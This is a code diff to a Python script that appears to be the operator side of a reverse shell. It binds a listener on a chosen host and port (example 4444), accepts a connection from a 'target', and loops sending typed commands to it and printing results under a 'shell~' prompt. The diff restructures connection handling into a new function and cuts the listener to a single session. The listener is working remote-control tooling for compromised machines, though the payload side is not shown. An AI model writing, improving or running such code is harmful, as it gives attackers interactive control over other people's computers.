@@ -1,4 +1,15 @@
+import sys
+import os
 import socket
+
+from importmonkey import add_path
+
+''' Export python module path '''
+
+_i = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+if _i not in sys.path:
+    add_path(_i)
+
 import json
 from toolbox.util.iputils import *
 
@@ -24,14 +35,19 @@ def reliable_receive(target):
         except:
             continue
 
-def communicate(ip):
+def handle_connection(s):
+    print("# Listening for incoming connections...")
+    target, ip = s.accept()
+    print(f"[+] Started new communication with {ip}")
+    communicate(target, ip)
+def communicate(target, ip):
     while(True):
         command = input("shell~%s" % str(ip))
-        reliable_send(command)
+        reliable_send(command, target)
         if command == "exit":
-            break
+            quit()
         else:
-            result = reliable_receive()
+            result = reliable_receive(target)
             print(result)
 
 interface = input("# Step 1: Specify network interface to use\n"
@@ -43,12 +59,6 @@ LPORT = input("# Step 2: Specify listener port\n"
                      "# ex. 4444\n")
 print(f"[i] LPORT is set to {LPORT}")
 s.bind((LHOST, int(LPORT)))
-MAX_SESSIONS = 5
-if input(f"[?] Leave default number of socket parallel sessions of {MAX_SESSIONS}? (y/n)\n") == 'n':
-    MAX_SESSIONS = input("# Specify number of socket parallel sessions\n")
-s.listen(MAX_SESSIONS)
-print("# Listening for incoming connections...")
+s.listen(1)
 while(True):
-    target, ip = s.accept()
-    print(f"[+] Started new communication with {ip}")
-    communicate(ip)
+    handle_connection(s)
